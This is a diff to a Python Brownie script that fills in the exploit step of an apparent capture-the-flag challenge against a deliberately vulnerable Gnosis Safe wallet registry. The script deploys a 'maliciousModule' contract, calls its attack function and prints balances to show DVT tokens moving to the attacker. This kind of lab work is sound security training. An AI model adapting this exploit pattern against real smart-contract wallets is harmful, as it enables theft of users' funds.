@@ -1,5 +1,6 @@
 from pathlib import Path
 from brownie import ZERO_ADDRESS, accounts, WalletRegistry, DamnValuableToken, project, Wei
+import web3
 import eth_account
 
 
@@ -51,7 +52,35 @@ def before():
     
     
 def exploit():
-    pass
+    
+    from brownie import maliciousModule
+
+    malicious_contract = maliciousModule.deploy(GnosisSafe[-1].address, GnosisSafeProxyFactory[-1].address, DamnValuableToken[-1].address, wallet_users[0].address, WalletRegistry[-1].address, ATTACKER, {"from": ATTACKER})
+
+    print("--- prep malicious contract and tests ---")
+
+    tx = malicious_contract.attack(wallet_users)
+    return_attack = tx.return_value
+    print(f"return_attack: {return_attack}")
+
+    print(f'balance attacke in DVT token BEFORE: {DamnValuableToken[-1].balanceOf(ATTACKER)}')
+
+    print("--- ATTACK phase ---")
+
+    # request the creation of a new proxy, using the call back function which will call the proxyCreated() function of the malicious contract instead of the registry
+    
+    # initializer = GnosisSafe[-1].setup.encode_input(wallet_users, 1, malicious_contract.address, '', malicious_contract.address, '0x0000000000000000000000000000000000000000', 0, '0x0000000000000000000000000000000000000000')
+    # print(f"initialyzer: {initializer}")
+
+    real_proxy_created = tx.return_value
+    print(f"factory address: : {GnosisSafeProxyFactory[-1].address}")
+    print(f"gnosis master address: : {GnosisSafe[-1].address}")
+    print(f"malicious address: : {malicious_contract.address}")
+    print(f"real_proxy_created: : {real_proxy_created}")
+    print(f"registry address: : {WalletRegistry[-1].address}")
+
+    print(f'balance attacke in DVT token AFTER: {DamnValuableToken[-1].balanceOf(malicious_contract)}')
+
 
 def after():
     assert DamnValuableToken[-1].balanceOf(ATTACKER) >= Wei("39 ether")
